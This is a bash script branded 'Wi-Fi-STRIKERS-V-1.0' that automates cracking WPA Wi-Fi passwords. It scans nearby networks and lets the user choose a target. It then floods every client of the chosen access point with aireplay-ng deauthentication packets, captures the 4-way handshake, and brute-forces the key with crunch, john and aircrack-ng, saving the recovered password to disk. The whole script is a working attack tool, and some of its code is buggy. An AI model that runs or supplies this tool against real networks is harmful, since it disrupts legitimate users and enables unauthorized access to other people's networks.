#!/bin/bash

if [ -z ${W_DEBUG+x} ]; then W_DEBUG=0
    else W_DEBUG=1
fi

if [ -z ${KEEP_NETWORK+x} ]; then KEEP_NETWORK=0
    else KEEP_NETWORK=1
fi

if [ -z ${W_AUTO+x} ]; then W_AUTO=0
    else W_AUTO=1
fi

if [[ $EUID -ne 0 ]]; then
        echo -e "\e[1;31mYou don't have admin privilegies, execute the script as root.""\e[0m"""
        exit 1
fi

if [ -z "${DISPLAY:-}" ]; then
        echo -e "\e[1;31mThe script should be exected inside a X (graphical) session.""\e[0m"""
        exit 1
fi

clear

DUMP_PATH="/tmp/TMPflux"
WAY_PATH= "/"
HANDSHAKE_PATH="/root/handshakes"
PASSLOG_PATH="/root/pwlog"
WORK_DIR=`pwd`
DEAUTHTIME="1000"

white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
cyan="\033[0;36m"
cafe="\033[0;33m"
blue="\033[1;34m"
transparent="\e[0m"

general_back=" Back"
general_error_1=" Not_Found"
general_case_error=" Unknown option. Choose again"
general_exitmode="Reverting back the changes made to your PC"
exitmode_1="Shifting your Wireless NIC from monitor mode to managed mode"
exitmode_2="Revertion of Wireless NIC back to managed mode successfully done"
exitmode_3="Restarting Network Manager"
exitmode_4="Your PC is successfully reverted back to previous state"
exitmode_5="Thank You for using $red""Wi-Fi-$green""STRIKERS-$blue""V-$yellow""1$cyan"".$grey""0"$transparent""
exitmode_6="HOPE TO SEE YOU SOON!!!"

if [ $W_DEBUG = 1 ]; then
        ## Developer Mode
        export output_screen=/dev/stdout
        HOLD="-hold"
else
        ## Normal Mode
        export output_screen=/dev/null
        HOLD=""
fi


function conditional_clear()
{

        if [[ "$output_screen" != "/dev/stdout" ]]; then 
               clear;
        fi

}


function airmon
{
       
        chmod +x Library/airmon/airmon.sh

}
airmon


function err_report
{
        
        echo "Error on line $1"

}

if [ $W_DEBUG = 1 ]; then
        trap 'err_report $LINENUM' ERR
fi

trap exitmode SIGINT SIGHUP

source Library/exitmode.sh

source Language/source

i=1


function top()
{

        conditional_clear

        if [ $i -eq '1' ] ; then
          brand
          sleep 2
          echo " "
          echo " "
          echo -e "$purple""Firing up $red""Wi-Fi-$green""STRIKERS-$blue""V-$yellow""1$cyan"".$grey""0$purple""...$transparent"
          sleep 5
          ((i=i-1))
        fi
        
        conditional_clear

        echo -e "\t\t\t\t\t       $cafe""========================================================"
        echo -e "\t\t\t\t\t       $cafe""|| $red""Wi-Fi-$green""STRIKERS-$blue""V-$yellow""1$purple"".$grey""0 $cyan""[ Automating The Attacks... ] $cafe""||"
        echo -e "\t\t\t\t\t       $cafe""========================================================"
        echo " "
        echo " "

}


function brand
{

          sleep 1
          echo -e "$cafe""           ==============================================================================================================================="
          echo -e "$cafe""           ||  $red""#   #   #   0     # # #  0     $green""& & &  & & & & &  & & &   &   &    &   & & &   & & &   & & &     $blue""%     %     $yellow""1    $grey""0 0 0  $cafe"" ||"
          echo -e "$cafe""           ||  $red""#   #   #         #            $green""&          &      &   &   &   &  &     &       &   &   &         $blue""%     %     $yellow""1    $grey""0   0  $cafe"" ||"
          echo -e "$cafe""           ||  $red""#   #   #   #  -  # # #  #  -  $green""& & &      &      & & &   &   & &      & & &   & & &   & & &  -  $blue""%     %  -  $yellow""1    $grey""0   0  $cafe"" ||"
          echo -e "$cafe""           ||  $red""#   #   #   #     #      #     $green""    &      &      & &     &   &  &     &       & &         &       $blue""%  %      $yellow""1    $grey""0   0  $cafe"" ||"
          echo -e "$cafe""           ||  $red""# # # # #   #     #      #     $green""& & &      &      &   &   &   &    &   & & &   &   &   & & &        $blue""%        $yellow""1 $cyan"":: $grey""0 0 0  $cafe"" ||"
          
          echo -e "$cafe""           ||                                                                                                                           ||"

          echo -e "$cafe""           ||                                                                                                                           ||"

          echo -e "           ||                                            $red""CODE DEVELOPED BY $green""YAYADY S $cafe""                                          ||"
   
          echo -e "$cafe""           ==============================================================================================================================="

}


function checkdependences
{

        echo -ne "$yellow"" aircrack-ng.....$blue Check$transparent"
        sleep 0.025
        echo " "
        if ! hash aircrack-ng 2>/dev/null; then
                echo -e " [\e[1;31mFAILED$transparent] "$transparent"aircrack-ng was not found!  Please install it..."
                exit=1
        else
                echo -e " [\e[1;32mOK$transparent] "$transparent"Check Passed"
        fi
        sleep 0.025

        echo -ne "$yellow"" aireplay-ng.....$blue Check$transparent"
        sleep 0.025
        echo " "
        if ! hash aireplay-ng 2>/dev/null; then
                echo -e " [\e[1;31mFAILED$transparent] "$transparent"aireplay-ng was not found!  Please install it..."
                exit=1
        else
                echo -e " [\e[1;32mOK$transparent] "$transparent"Check Passed"
        fi
        sleep 0.025

        echo -ne "$yellow"" airmon-ng.......$blue Check$transparent"
        sleep 0.025
        echo " "
        if ! hash airmon-ng 2>/dev/null; then
                echo -e " [\e[1;31mFAILED$transparent] "$transparent"airmon-ng was not found!  Please install it..."
                exit=1
        else
                echo -e " [\e[1;32mOK$transparent] "$transparent"Check Passed"
        fi
        sleep 0.025

        echo -ne "$yellow"" airodump-ng.....$blue Check$transparent"
        sleep 0.025
        echo " "
        if ! hash airodump-ng 2>/dev/null; then
                echo -e " [\e[1;31mFAILED$transparent] "$transparent"airodump-ng was not found!  Please install it..."
                exit=1
        else
                echo -e " [\e[1;32mOK$transparent] "$transparent"Check Passed"
        fi
        sleep 0.025


        echo -ne "$yellow"" iwconfig........$blue Check$transparent"
        sleep 0.025
        echo " "
        if ! hash iwconfig 2>/dev/null; then
                echo -e " [\e[1;31mFAILED$transparent] "$transparent"iwconfig was not found!  Please install it..."
                exit=1
        else
                echo -e " [\e[1;32mOK$transparent] "$transparent"Check Passed"
        fi
        sleep 0.025

        echo -ne "$yellow"" xterm...........$blue Check$transparent"
        sleep 0.025
        echo " "
        if ! hash xterm 2>/dev/null; then
                echo -e " [\e[1;31mFAILED$transparent] "$transparent"xterm was not found!  Please install it..."
                exit=1
        else
                echo -e " [\e[1;32mOK$transparent] "$transparent"Check Passed"
        fi
        sleep 0.025

        echo -ne "$yellow"" rfkill..........$blue Check$transparent"
        sleep 0.025
        echo " "
        if ! hash rfkill 2>/dev/null; then
                echo -e " [\e[1;31mFAILED$transparent] "$transparent"rfkill was not found!  Please install it..."
                exit=1
        else
                echo -e " [\e[1;32mOK$transparent] "$transparent"Check Passed"
        fi
        sleep 0.025

        echo -ne "$yellow"" tput..........$blue Check$transparent"
        sleep 0.025
        echo " "
        if ! hash tput 2>/dev/null; then
                echo -e " [\e[1;31mFAILED$transparent] "$transparent"tput was not found!  Please install it..."
                exit=1
        else
                echo -e " [\e[1;32mOK$transparent] "$transparent"Check Passed"
        fi
        sleep 0.025

        if [ "$exit" = "1" ]; then
        echo " "
        echo " Please install the tools and try again..."
        echo " "
        echo " Hope to see you again..."
        exit 1
        fi

        sleep 1
        clear
}
top
checkdependences

if [ ! -d $DUMP_PATH ]; then
        mkdir -p $DUMP_PATH &>$output_screen
fi

if [ ! -d $HANDSHAKE_PATH ]; then
        mkdir -p $HANDSHAKE_PATH &>$output_screen
fi

if [ ! -d $PASSLOG_PATH ]; then
        mkdir -p $PASSLOG_PATH &>$output_screen
fi


function ap
{

        Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]`
        Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | cut -d " " -f 5-`
        
        echo " "
        echo -e "\t  $red""INFO WIFI"
        echo " "
        echo -e " "$blue"SSID"$transparent" = $Host_SSID / $Host_ENC"
        echo -e " "$blue"Channel"$transparent" = $channel"
        echo -e " "$blue"Speed"$transparent" = ${speed:2} Mbps"
        echo -e " "$blue"BSSID"$transparent" = $mac (\e[1;33m$Host_MAC_MODEL $transparent)"
        echo " "
        echo " "

}


function setresolution
{

        function resA {

		        TOPLEFT="-geometry 90x13+0+0"
		        TOPRIGHT="-geometry 83x26-0+0"
		        BOTTOMLEFT="-geometry 90x24+0-0"
		        BOTTOMRIGHT="-geometry 75x12-0-0"
		        TOPLEFTBIG="-geometry 91x42+0+0"
		        TOPRIGHTBIG="-geometry 83x26-0+0"
                      }

        function resB {

		        TOPLEFT="-geometry 92x14+0+0"
		        TOPRIGHT="-geometry 68x25-0+0"
		        BOTTOMLEFT="-geometry 92x36+0-0"
		        BOTTOMRIGHT="-geometry 74x20-0-0"
		        TOPLEFTBIG="-geometry 100x52+0+0"
		        TOPRIGHTBIG="-geometry 74x30-0+0"

                      }

        function resC {

		        TOPLEFT="-geometry 100x20+0+0"
		        TOPRIGHT="-geometry 109x20-0+0"
		        BOTTOMLEFT="-geometry 100x30+0-0"
		        BOTTOMRIGHT="-geometry 109x20-0-0"
		        TOPLEFTBIG="-geometry  100x52+0+0"
		        TOPRIGHTBIG="-geometry 109x30-0+0"

                      }

        function resD {

		        TOPLEFT="-geometry 110x35+0+0"
		        TOPRIGHT="-geometry 99x40-0+0"
		        BOTTOMLEFT="-geometry 110x35+0-0"
		        BOTTOMRIGHT="-geometry 99x30-0-0"
		        TOPLEFTBIG="-geometry 110x72+0+0"
		        TOPRIGHTBIG="-geometry 99x40-0+0"

                      }

        function resE {

		        TOPLEFT="-geometry 130x43+0+0"
		        TOPRIGHT="-geometry 68x25-0+0"
		        BOTTOMLEFT="-geometry 130x40+0-0"
		        BOTTOMRIGHT="-geometry 132x35-0-0"
		        TOPLEFTBIG="-geometry 130x85+0+0"
		        TOPRIGHTBIG="-geometry 132x48-0+0"

                      }

        function resF {

		        TOPLEFT="-geometry 100x17+0+0"
		        TOPRIGHT="-geometry 90x27-0+0"
		        BOTTOMLEFT="-geometry 100x30+0-0"
		        BOTTOMRIGHT="-geometry 90x20-0-0"
		        TOPLEFTBIG="-geometry  100x70+0+0"
		        TOPRIGHTBIG="-geometry 90x27-0+0"

                      }

	detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
	##  A) 1024x600
	##  B) 1024x768
	##  C) 1280x768
	##  D) 1280x1024
	##  E) 1600x1200
	##  F) 1366x768
	case $detectedresolution in
		"1024x600" ) resA ;;
		"1024x768" ) resB ;;
		"1280x768" ) resC ;;
		"1366x768" ) resC ;;
		"1280x1024" ) resD ;;
		"1600x1200" ) resE ;;
		"1366x768"  ) resF ;;
		          * ) resA ;;
	esac

  Language

}


function Language
{

        conditional_clear
        top
        source $WORK_DIR/Language/Standard; interface

}


function interface
{

        conditional_clear
        top

        FILE1=//$Host_MAC-01.cap
        if test -f "$FILE1"; then
           crack;
        fi

        echo -e "$red"" SETTING UP YOUR WIRELESS NETWORK INTERFACE CARD FROM "$blue"MANAGED MODE "$red"TO "$green"MONITOR MODE..."$transparent""
        echo " "
        echo -e "$blue"" WARNING : "$yellow"IF THERE IS NO WIRELESS NETWORK INTERFACE CARD DETECTED, $red""Wi-Fi-$green""STRIKERS-$blue""V-$yellow""1$cyan"".$grey""0 $yellow""WILL AUTOMATICALLY PERFROM EXIT OPERATIONS"$transparent""
        sleep 2

        #unblock interfaces
        rfkill unblock all

        # Collect all interfaces in montitor mode & stop all
        KILLMONITOR=`iwconfig 2>&1 | grep Monitor | awk '{print $1}'`

        for monkill in ${KILLMONITOR[@]}; do
                airmon-ng stop $monkill >$output_screen
                echo " "
                echo -n " $monkill"
        done

        # Create a variable with the list of physical network interfaces
        readarray -t wirelessifaces < <(./Library/airmon/airmon.sh    |grep "-" | cut -d- -f1)
        INTERFACESNUMBER=`./Library/airmon/airmon.sh   | grep -c "-"`


        if [ "$INTERFACESNUMBER" -gt "0" ]; then

                if [ "$INTERFACESNUMBER" -eq "1" ]; then
                        PREWIFI=$(echo ${wirelessifaces[0]} | awk '{print $1}')
                else
                        echo $header_setinterface
                        echo
                        i=0

                        for line in "${wirelessifaces[@]}"; do
                                i=$(($i+1))
                                wirelessifaces[$i]=$line
                                echo -e "      "$red"["$yellow"$i"$red"]"$transparent" $line"
                        done

                        if [ "$W_AUTO" = "1" ];then
                                line="1"
                        else
                                echo
                                echo -n -e "$red"" Wi-Fi-$green""STRIKERS-$blue""V-$yellow""1$cyan"".$grey""0$red"" => "$transparent""
                                read line
                        fi

                        PREWIFI=$(echo ${wirelessifaces[$line]} | awk '{print $1}')

                fi

                if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
                        conditional_clear
                        top
                        interface
                fi

                readarray -t naggysoftware < <(./Library/airmon/airmon.sh check $PREWIFI | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')
                WIFIDRIVER=$(./Library/airmon/airmon.sh | grep "$PREWIFI" | awk '{print($(NF-2))}')

                if [ ! "$(echo $WIFIDRIVER | egrep 'rt2800|rt73')" ]; then
                rmmod -f "$WIFIDRIVER" &>$output_screen 2>&1
                fi

                if [ $KEEP_NETWORK = 0 ]; then

                for nagger in "${naggysoftware[@]}"; do
                        killall "$nagger" &>$output_screen
                done
                sleep 0.5

                fi

                if [ ! "$(echo $WIFIDRIVER | egrep 'rt2800|rt73')" ]; then
                modprobe "$WIFIDRIVER" &>$output_screen 2>&1
                sleep 0.5
                fi

                # Select Wifi Interface
                select PREWIFI in $INTERFACES; do
                        break;
                done

                WIFIMONITOR=$(./Library/airmon/airmon.sh start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
                WIFI_MONITOR=$WIFIMONITOR
                WIFI=$PREWIFI
   
                
        echo " "
        echo " "
        echo -e "$green"" WIRELESS NETWORK INTERFACE CARD DETECTED IN YOUR PC AND IT WAS SET TO MONITOR MODE"$transparent""
        echo " "
        sleep 5


                #No wireless cards
        else

                echo " "
                echo -e "$green"" NO WIRELESS NETWORK INTERFACE CARD WAS FOUND..."
                sleep 2
                echo " "
                echo -e "$blue"" QUITTING NOW...""$transparent"
                sleep 4
                exitmode
        fi

        scan

}


function scan
{

        conditional_clear
        CSVDB=dump-01.csv

        rm -rf $DUMP_PATH/*

        choosescan
        selection

}


function choosescan
{

        if [ "$W_AUTO" = "1" ];then
                scanallchannels
        else
                conditional_clear
                while true; do
                        conditional_clear
                        top

                        echo -e "$green"" MONITORING THE AVAILABLE Wi-Fi NETWORKS AROUND WITHIN THE RANGE OF YOUR WIRELESS NETWORK INTERFACE CARD$transparent"
                        echo "                                       "
                        echo -e "      "$cafe"("$red"1"$cafe")"$transparent" Scan all channels"
                        echo -e "      "$cafe"("$red"2"$cafe")"$transparent" EXIT"$transparent
                        echo "                                       "
                        echo -n -e "$red"" Wi-Fi-$green""STRIKERS-$blue""V-$yellow""1$cyan"".$grey""0$red"" => "$transparent""
                        read yn
                        echo ""
                        case $yn in
                                1 ) scanallchannels ; break ;;
                                2 ) exitmode ; break;;
                                * ) echo "Unknown option. Please choose again"; conditional_clear ;;
                        esac
                done
        fi

}



function scanallchannels {

        conditional_clear
        rm -rf $DUMP_PATH/dump*

        if [ "$W_AUTO" = "1" ];then
                sleep 30 && killall xterm &
        fi
        xterm $HOLD -title "$header_scan" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w $DUMP_PATH/dump -a --encrypt WPA --ignore-negative-one $WIFI_MONITOR

}



function selection
{

        conditional_clear
        top


        LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`

        if [ "$LINEAS_WIFIS_CSV" = "" ];then
                conditional_clear
                top
                echo -e "$red"" Error: your wireless card  isn't supported..."
                echo " "
                echo -n -e "$green"" Exiting now..."
                
        fi

        if [ $LINEAS_WIFIS_CSV -le 3 ]; then
                scan && break
        fi

        strikers=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
        strikers=`expr $strikers - 1`
        head -n $strikers $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv
        tail -n +$strikers $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv
        echo -e "$green""                        WIFI LIST "
        echo ""
        echo -e "$cyan"" ID     MAC                       CHAN   SECU     PWR     ESSID"
        echo ""
        i=0

        while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
                longueur=${#MAC}
                PRIVACY=$(echo $PRIVACY| tr -d "^ ")
                PRIVACY=${PRIVACY:0:4}
                if [ $longueur -ge 17 ]; then
                        i=$(($i+1))
                        POWER=`expr $POWER + 100`
                        CLIENTE=`cat $DUMP_PATH/clientes.csv | grep $MAC`

                        if [ "$CLIENTE" != "" ]; then
                                CLIENTE="*"
                        echo -e " "$cafe"("$red"$i"$cafe")" $green"$CLIENTE\t""$red"$MAC"\t""$red "$CHANNEL"\t""$green" $PRIVACY"\t  ""$red"$POWER%"\t""$red "$ESSID""$transparent""

                        else

                        echo -e " "$cafe"("$red"$i"$cafe")" $white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$blue" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""

                        fi

                        aidlength=$IDLENGTH
                        assid[$i]=$ESSID
                        achannel[$i]=$CHANNEL
                        amac[$i]=$MAC
                        aprivacy[$i]=$PRIVACY
                        aspeed[$i]=$SPEED
                fi
        done < $DUMP_PATH/dump-02.csv

        # Select the first network if you select the first network
        if [ "$W_AUTO" = "1" ];then
                choice=1
        else
                echo
                echo -e ""$yellow "("$green"*"$yellow") $blue""Represents Connected Clients"$transparent""
                echo ""
                echo -e "$grey"" Enter the target network's ID to launch an attack on it. To rescan the available Wi-Fi Networks, enter $cafe""'$red""S$cafe""'$grey""..."
                echo " "
                echo " "
                echo -n -e "$red"" Wi-Fi-$green""STRIKERS-$blue""V-$yellow""1$cyan"".$grey""0$red"" => "$transparent""
                read choice
        fi

        if [[ $choice -eq "S || s" ]]; then
                scan
        fi

        idlength=${aidlength[$choice]}
        ssid=${assid[$choice]}
        channel=$(echo ${achannel[$choice]}|tr -d [:space:])
        mac=${amac[$choice]}
        privacy=${aprivacy[$choice]}
        speed=${aspeed[$choice]}
        Host_IDL=$idlength
        Host_SPEED=$speed
        Host_ENC=$privacy
        Host_MAC=$mac
        Host_CHAN=$channel
        acouper=${#ssid}
        fin=$(($acouper-idlength))
        Host_SSID=${ssid:1:fin}
        Host_SSID2=`echo $Host_SSID | sed 's/ //g' | sed 's/\[//g;s/\]//g' | sed 's/\://g;s/\://g' | sed 's/\*//g;s/\*//g' | sed 's/(//g' | sed 's/)//g'`
        #conditional_clear
        clientselection
        interface
        
}


function clientselection
{

        conditional_clear
        top

        if [ "$W_AUTO" = "1" ];then
                deauth all
        else
                
                while true; do
                        top

                        ap

                        echo -e "$green"" SELECT YOUR CHOICE OF DEAUTHENTICATION ATTACK TO BE PERFORMED ON THE TARGET ACCESS POINT"
                        echo " "
                        echo -e "      "$cafe"("$red"1"$cafe")"$transparent" Deauthenticate all the clients from the target Access Point"$transparent
                        echo -e "      "$cafe"("$red"2"$cafe")"$transparent" Rescan the available networks "
                        echo -e "      "$cafe"("$red"3"$cafe")"$transparent" EXIT"
                        echo "                                       "
                        echo -n -e "$red"" Wi-Fi-$green""STRIKERS-$blue""V-$yellow""1$cyan"".$grey""0$red"" => "$transparent""
                        read yn
                        echo ""
                        case $yn in
                                1 ) deauth all; break ;;
                                2 ) killall airodump-ng &>$output_screen; scan; break;;
                                3 ) exitmode; break ;;
                                * ) echo "$general_case_error"; conditional_clear ;;
                        esac
                done
        fi

}


function deauth
{

        conditional_clear
        top

        iwconfig $WIFI_MONITOR channel $Host_CHAN

        case $1 in
                all )
                        DEAUTH=deauthall
                        capture & deauthall
                        CSVDB=$Host_MAC-01.csv
                ;;

        esac

}


function deauthall
{

        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR

}


function capture
{

        if ! ps -A | grep -q airodump-ng; then
                rm -rf $DUMP_PATH/$Host_MAC*
        xterm $HOLD -title "Capturing data on channel --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng --bssid $Host_MAC -w "$WAY_PATH/$Host_MAC" -c $Host_CHAN -a --ignore-negative-one $WIFI_MONITOR & response
        fi

}


function response
{

top
ap
echo " "
echo -e "$red"" CAPTURING THE "$red"4 - WAY HANDSHAKE"$transparent""
echo " "

}


function crack
{

cd ~ && cd /
echo -e "$green"" HANDSHAKE CAPTURE SUCCESSFUL"$transparent""
echo " "
echo -e "$red"" CRACKING THE PASSWORD OF THE TARGET NETWORK..."$transparent""
echo " "
echo " Do you guess any characters in the password? (Yes/No)"
echo " "
echo " 1 => Yes"
echo " 2 => No"
echo " "
echo -n -e "$red"" Wi-Fi-$green""STRIKERS-$blue""V-$yellow""1$cyan"".$grey""0$red"" => "$transparent""
read option
echo " "
case $option in

     1 ) echo " "
         echo " Enter the predicted characters... "
         read ch   
         echo " "
         echo " "
         echo " Cracking the key..." 
         echo " "
         echo " This may take some time..."
         echo " "
         echo " "
         sleep 2

         xterm $HOLD -title "CRACKING THE PASSWORD" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e "crunch 8 63 $ch | john --stdin --stdout | aircrack-ng -b $Host_MAC -w - -l $Host_MAC.txt $Host_MAC-01.cap"
         sleep 2 ;;


     2 ) echo " "
         echo "Cracking the key..."
         echo " "
         echo " This may take some time..."
         echo " "
         echo " "
         sleep 2
         
         xterm $HOLD -title "CRACKING THE PASSWORD" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e "crunch 8 63 | john --stdin --stdout | aircrack-ng -b $Host_MAC -w - -l $Host_MAC.txt $Host_MAC-01.cap"
         sleep 2 ;;


esac

FILE2=$Host_MAC.txt
if test -f $FILE2; then
        echo "Password File saved at / ( root file system ) in the name of the BSSID (MAC Address) of the target AP"
        sleep 10
fi

exitmode
exit

}


top && setresolution && interface

